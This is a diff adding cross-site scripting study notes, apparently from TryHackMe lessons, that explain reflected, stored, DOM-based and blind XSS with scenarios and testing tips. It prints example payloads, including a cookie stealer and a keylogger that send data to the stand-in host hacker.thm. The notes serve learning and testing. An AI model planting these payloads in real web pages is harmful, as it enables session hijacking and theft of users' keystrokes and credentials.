@@ -535,6 +535,137 @@ An Allow list is where all requests get denied unless they appear on a list or m
 
 If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the umber of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice. 
 
+## Cross-Site Scripting 
+
+In XSS, the payload is the Java Script code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification. 
+
+The intention is what you wish the JavaScript to actually do (which we will cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task). 
+
+Here are some examples of XSS intentions. 
+
+### Proof Of Concept: 
+
+This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example: 
+
+```<script>alert('XSS');</script>```
+
+### Session Stealing 
+
+Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged at that user. 
+
+```<script>fetch('https://hacker.thm/steal?cookie=' +btoa(document.cookie));</script>```
+
+### Key Logger
+
+The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
+
+```<script>document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>```
+
+### Business Logic
+
+This payload is a lot more specific than the above examples. This would be about calling a particular network resources or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called ```user.changeEmail()```. You payload could be like: ```<script>user.changeEmail('attacker@hacker.thm');</script>``` Now that the email address for the account has changed, the attacker may perform a reset password attack. The next four 
+
+## Reflected XSS
+
+Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
+
+### Example Scenario:
+
+A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source. 
+
+![image](https://user-images.githubusercontent.com/79100627/167325502-cf3b0197-b649-45b8-ae8e-c19c40f0fa4b.png)
+
+The application does not check the contents of the error parameter, which allows the attacker to insert malicious code. 
+
+![image](https://user-images.githubusercontent.com/79100627/167325561-397fa219-fc5f-4ee8-a125-407ba0bbf9c1.png)
+
+The vulnerability can be used as per the scenario:
+![image](https://user-images.githubusercontent.com/79100627/167325626-e0da16e1-514c-415c-bead-11e0e2ad938e.png)
+
+### Potential Impact
+
+The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information. 
+
+### How to test for Reflected XSS:
+
+You will need to test every possible point of entry; these include:
+
+- Parameters in the URL Query String 
+- URL File Path 
+- Sometimes HTTP Headers (although unlikely exploitable in practice) 
+
+Once you have found some data which is being reflected in the web application, you will then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected
+
+## Stored XSS 
+
+As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page. 
+
+### Example Scenario 
+
+A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser
+
+![image](https://user-images.githubusercontent.com/79100627/167326028-e5f765e7-d675-4334-b10f-b0261b7f0f23.png)
+
+### Potential Impact
+
+The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perfrom other website actions while acting as the visiting user. 
+
+### How to test for Stored XSS
+
+You will need to test every possbile point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:
+- Comments on a blog
+- User profile information
+- Website Listings 
+
+Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application woulnd't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting integer from a dropdown menu, but instead, you manually send the reuqest rather than using the form allowing you to try malicious payloads. 
+
+## DOM Based XSS
+
+### What is DOM?
+ 
+DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below.
+
+![image](https://user-images.githubusercontent.com/79100627/167326371-3f3f52ff-c96a-4870-b244-42f2ea737280.png)
+
+### Exploiting the DOM 
+
+DOM based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction 
+
+### Example Scenario 
+
+The website's JavaScripts gets the contents from the ```window.location.hash``` parameter and then writes that onto the page in the curently being viewed section. The contents of the hash are not checked for malicious code, allowing an attacker to inject Javascript of their choosing onto the webpage
+
+### Potential Impact 
+
+crafted links could sent to potential victims, redirecting them to another website or steal content from the page or the user's session
+
+### How to test for Dom Based XSS
+
+DOM based XSS can be challenging to test for requires a certain amount of knowledge of JavaScript to read the source code. You would need to look for parts of the code that access certain variables that an attacker can have control over such as ```window.location.x``` parameters 
+
+When you have found those bits of code, you would then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as ```eval()``` 
+
+## Blind XSS 
+
+Blind XSS is similar to a stored XSS (which we covered in task 5) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
+
+### Example Scenario
+
+A website has a contact form where you can message a member to staff. The message content does not get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web protal 
+
+### Potential Impact
+
+Using the correct payload, the attacker's JS could make calls back to an attacker's website, revealing the staff protal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.
+
+### How to test for Blind XSS 
+
+When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed. 
+
+A popular tool for Blind XSS attacker is xsshunter. Although it is possible to make your own tool in java script, this tool will automatically capture cookies, URLS, page contents and more. 
+
+
+
+
 
 
 
